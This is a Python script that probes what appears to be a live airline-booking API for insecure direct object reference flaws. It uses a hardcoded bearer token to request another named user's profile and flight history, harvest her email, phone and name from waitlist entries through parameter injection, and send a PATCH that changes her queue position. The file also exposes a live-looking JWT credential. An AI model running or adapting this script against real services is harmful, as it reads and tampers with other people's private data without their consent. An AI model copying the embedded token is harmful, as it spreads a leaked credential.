#!/usr/bin/env python3
"""
Improved IDOR Testing - Properly validates if other user's data is accessible
Tests by comparing returned data against expected user IDs
"""

import requests
import json
from datetime import datetime

BASE_URL = "https://vauntapi.flyvaunt.com"
SAMEER_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
SAMEER_USER_ID = 20254
ASHLEY_USER_ID = 26927

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def test_idor_with_validation(endpoint, description, target_user_id, auth_user_id):
    """Test endpoint and validate if it returns target user's data"""
    headers = {"Authorization": f"Bearer {SAMEER_JWT}"}
    url = f"{BASE_URL}{endpoint}"

    print(f"\n{Colors.CYAN}Testing: {description}{Colors.END}")
    print(f"Endpoint: GET {endpoint}")
    print(f"Target User ID: {target_user_id}")

    try:
        response = requests.get(url, headers=headers, timeout=10)

        if response.status_code != 200:
            print(f"{Colors.GREEN}✓ Protected - Status {response.status_code}{Colors.END}")
            return False

        # Parse response
        try:
            data = response.json()
        except:
            print(f"{Colors.GREEN}✓ Protected - Non-JSON response{Colors.END}")
            return False

        # Check if response contains target user's ID
        data_str = json.dumps(data)

        # Check for various user ID fields
        is_vulnerable = False
        reason = ""

        # Check if it's a user profile response
        if isinstance(data, dict):
            returned_user_id = data.get('id') or data.get('userId') or data.get('user')

            if returned_user_id == target_user_id:
                is_vulnerable = True
                reason = f"Returns target user's profile (ID: {returned_user_id})"
            elif returned_user_id == auth_user_id:
                is_vulnerable = False
                reason = f"Returns authenticated user's own data (ID: {returned_user_id})"

            # Check for entrants or nested user data
            if 'entrants' in data:
                for entrant in data.get('entrants', []):
                    if entrant.get('user') == target_user_id:
                        # Check if this reveals PII
                        if any(key in entrant for key in ['email', 'phoneNumber', 'firstName', 'lastName']):
                            is_vulnerable = True
                            reason = f"Exposes target user's PII in entrants data"
                            break

            # Check for email, phone, or other PII fields
            if any(field in data for field in ['email', 'phoneNumber', 'firstName', 'lastName']):
                # Verify it's not the authenticated user's data
                if data.get('email') and data.get('id') == target_user_id:
                    is_vulnerable = True
                    reason = f"Exposes target user's PII (email: {data.get('email')})"

        # Check if it's a list of flights/records with target user data
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    if item.get('user') == target_user_id or item.get('userId') == target_user_id:
                        if any(key in item for key in ['email', 'phoneNumber', 'firstName', 'lastName']):
                            is_vulnerable = True
                            reason = f"List contains target user's PII"
                            break

        # Check if response data is tagged with user field
        if 'data' in data and isinstance(data['data'], list):
            for item in data['data']:
                if isinstance(item, dict):
                    # Check entrants in flights
                    if 'entrants' in item:
                        for entrant in item['entrants']:
                            if entrant.get('user') == target_user_id:
                                # This might expose that the user entered this flight
                                if any(key in entrant for key in ['email', 'phoneNumber', 'firstName', 'lastName', 'queuePosition']):
                                    is_vulnerable = True
                                    reason = f"Exposes target user's flight entrant data"
                                    break

        if is_vulnerable:
            print(f"{Colors.RED}{Colors.BOLD}🚨 VULNERABLE: {reason}{Colors.END}")
            print(f"Sample data: {json.dumps(data, indent=2)[:500]}")
            return True
        else:
            if reason:
                print(f"{Colors.GREEN}✓ Protected - {reason}{Colors.END}")
            else:
                print(f"{Colors.GREEN}✓ Protected - No target user data found{Colors.END}")
            return False

    except Exception as e:
        print(f"{Colors.YELLOW}✗ Error: {str(e)}{Colors.END}")
        return False

def main():
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}IMPROVED IDOR VULNERABILITY TESTING{Colors.END}")
    print(f"{Colors.BOLD}(With proper data validation){Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}\n")

    print(f"Tester: Sameer (ID: {SAMEER_USER_ID})")
    print(f"Target: Ashley (ID: {ASHLEY_USER_ID})")

    vulnerabilities = []

    # Test user profile endpoints
    print(f"\n{Colors.BOLD}=== Testing User Profile Endpoints ==={Colors.END}")

    tests = [
        (f"/v1/user?id={ASHLEY_USER_ID}", "V1 user with id parameter"),
        (f"/v1/user?userId={ASHLEY_USER_ID}", "V1 user with userId parameter"),
        (f"/v1/user/{ASHLEY_USER_ID}", "V1 user by path parameter"),
        (f"/v2/user?id={ASHLEY_USER_ID}", "V2 user with id parameter"),
        (f"/v3/user?id={ASHLEY_USER_ID}", "V3 user with id parameter"),
    ]

    for endpoint, desc in tests:
        if test_idor_with_validation(endpoint, desc, ASHLEY_USER_ID, SAMEER_USER_ID):
            vulnerabilities.append((endpoint, desc))

    # Test flight history endpoints
    print(f"\n{Colors.BOLD}=== Testing Flight History Endpoints ==={Colors.END}")

    tests = [
        (f"/v1/flight-history?userId={ASHLEY_USER_ID}", "V1 flight history with userId"),
        (f"/v2/flight-history?user={ASHLEY_USER_ID}", "V2 flight history"),
        (f"/v3/flight-history?user={ASHLEY_USER_ID}", "V3 flight history"),
        (f"/v1/user/{ASHLEY_USER_ID}/flight-history", "User-specific flight history"),
    ]

    for endpoint, desc in tests:
        if test_idor_with_validation(endpoint, desc, ASHLEY_USER_ID, SAMEER_USER_ID):
            vulnerabilities.append((endpoint, desc))

    # Test with V3 parameter injection to find Ashley's entrants
    print(f"\n{Colors.BOLD}=== Testing V3 Parameter Injection for Entrant IDOR ==={Colors.END}")

    # First, try to find flights Ashley entered using V3 parameter injection
    print(f"\n{Colors.CYAN}Step 1: Finding flights Ashley entered...{Colors.END}")
    headers = {"Authorization": f"Bearer {SAMEER_JWT}"}

    try:
        # Use V3 showAllEntrants parameter
        response = requests.get(
            f"{BASE_URL}/v3/flight?includeExpired=false&nearMe=false&showAllEntrants=true",
            headers=headers,
            timeout=10
        )

        if response.status_code == 200:
            data = response.json()
            flights_with_ashley = []

            if 'data' in data:
                for flight in data['data']:
                    if 'entrants' in flight:
                        for entrant in flight['entrants']:
                            if entrant.get('user') == ASHLEY_USER_ID:
                                flights_with_ashley.append({
                                    'flight_id': flight.get('id'),
                                    'entrant_id': entrant.get('id'),
                                    'entrant_data': entrant
                                })

                                # Check if PII is exposed
                                pii_fields = ['email', 'phoneNumber', 'firstName', 'lastName', 'dateOfBirth']
                                exposed_pii = [f for f in pii_fields if f in entrant]

                                if exposed_pii:
                                    print(f"{Colors.RED}{Colors.BOLD}🚨 CRITICAL VULNERABILITY!{Colors.END}")
                                    print(f"Flight {flight.get('id')} exposes Ashley's PII in entrant data:")
                                    print(f"Exposed fields: {', '.join(exposed_pii)}")
                                    print(f"Entrant ID: {entrant.get('id')}")
                                    vulnerabilities.append(
                                        (f"/v3/flight?showAllEntrants=true",
                                         "V3 parameter injection exposes user PII in entrants")
                                    )

            if flights_with_ashley:
                print(f"\n{Colors.YELLOW}Found {len(flights_with_ashley)} flights where Ashley is an entrant{Colors.END}")

                # Now test if we can directly access/modify Ashley's entrant records
                print(f"\n{Colors.CYAN}Step 2: Testing direct entrant access...{Colors.END}")

                for flight_info in flights_with_ashley[:3]:  # Test first 3
                    entrant_id = flight_info['entrant_id']

                    # Try to get entrant details
                    test_idor_with_validation(
                        f"/v1/entrant/{entrant_id}",
                        f"Direct entrant access (Ashley's entrant {entrant_id})",
                        ASHLEY_USER_ID,
                        SAMEER_USER_ID
                    )

                    # Try to modify entrant (dangerous!)
                    print(f"\n{Colors.CYAN}Testing: Can we modify Ashley's entrant {entrant_id}?{Colors.END}")
                    try:
                        mod_response = requests.patch(
                            f"{BASE_URL}/v1/entrant/{entrant_id}",
                            headers=headers,
                            json={"queuePosition": 999},
                            timeout=10
                        )
                        if mod_response.status_code == 200:
                            print(f"{Colors.RED}{Colors.BOLD}🚨 CRITICAL: Can modify other user's entrant!{Colors.END}")
                            vulnerabilities.append(
                                (f"/v1/entrant/{entrant_id}", "Can modify other user's waitlist position")
                            )
                        else:
                            print(f"{Colors.GREEN}✓ Protected from modification - Status {mod_response.status_code}{Colors.END}")
                    except Exception as e:
                        print(f"{Colors.YELLOW}✗ Error testing modification: {e}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}Ashley has no active flight entrants to test{Colors.END}")

    except Exception as e:
        print(f"{Colors.YELLOW}✗ Error in V3 testing: {e}{Colors.END}")

    # Final summary
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}FINAL RESULTS{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}\n")

    if vulnerabilities:
        print(f"{Colors.RED}{Colors.BOLD}⚠️  {len(vulnerabilities)} REAL IDOR VULNERABILITIES FOUND{Colors.END}\n")
        for endpoint, desc in vulnerabilities:
            print(f"  • {endpoint}")
            print(f"    {desc}\n")
    else:
        print(f"{Colors.GREEN}{Colors.BOLD}✓ No IDOR vulnerabilities found{Colors.END}")
        print(f"{Colors.GREEN}All endpoints properly validate user authorization{Colors.END}")

    # Save results
    report = {
        "test_date": datetime.now().isoformat(),
        "tester_id": SAMEER_USER_ID,
        "target_id": ASHLEY_USER_ID,
        "vulnerabilities_found": len(vulnerabilities),
        "vulnerabilities": [{"endpoint": e, "description": d} for e, d in vulnerabilities]
    }

    with open("/home/user/vaunt/api_testing/improved_idor_results.json", "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n{Colors.CYAN}Results saved to: /home/user/vaunt/api_testing/improved_idor_results.json{Colors.END}")

if __name__ == "__main__":
    main()
